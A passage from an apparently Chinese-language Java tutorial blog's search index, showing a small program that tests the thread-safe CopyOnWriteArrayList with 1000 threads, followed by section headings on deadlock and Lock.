<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.Thread.syn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.CopyOnWriteArrayList;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试JUC安全类型的集合</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestJUC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        CopyOnWriteArrayList&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">CopyOnWriteArrayList</span>&lt;String&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt;&#123;</span><br><span class="line">                list.add(Thread.currentThread().getName());</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line">        Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">        System.out.println(list.size());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="1-11、死锁">1.7.1.11. 1.11、死锁</h4><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111153433704.png" alt="image-20221111153433704"></p>
<h4 id="1-12、Lock锁">1.7.1.12. 1.12、Lock锁</h4>]]></content>
      <categories>
        <category>高级语言</category>
        <category>Java</category>
      </categories>
  </entry>
</search>
